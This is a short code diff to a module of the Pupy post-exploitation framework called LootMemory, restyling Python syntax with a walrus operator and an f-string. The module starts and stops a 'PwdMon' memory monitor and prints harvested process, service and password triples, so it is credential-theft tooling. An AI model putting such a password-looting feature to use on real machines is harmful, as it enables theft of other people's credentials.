@@ -23,8 +23,7 @@ class LootMemory(PupyModule):
         dump = self.client.remote('loot_memory', 'dump')
 
         if args.action == 'start':
-            ok = start(poll=args.poll)
-            if ok:
+            if ok := start(poll=args.poll):
                 self.success('PwdMon has been started')
             else:
                 self.error('PwdMon has not been started')
@@ -35,7 +34,7 @@ class LootMemory(PupyModule):
                 self.error('PwdMon is not started')
             else:
                 for proc, service, pwd in results:
-                    self.success('[{}][{}]{}'.format(proc, service, pwd))
+                    self.success(f'[{proc}][{service}]{pwd}')
 
         elif args.action == 'stop':
             stop()
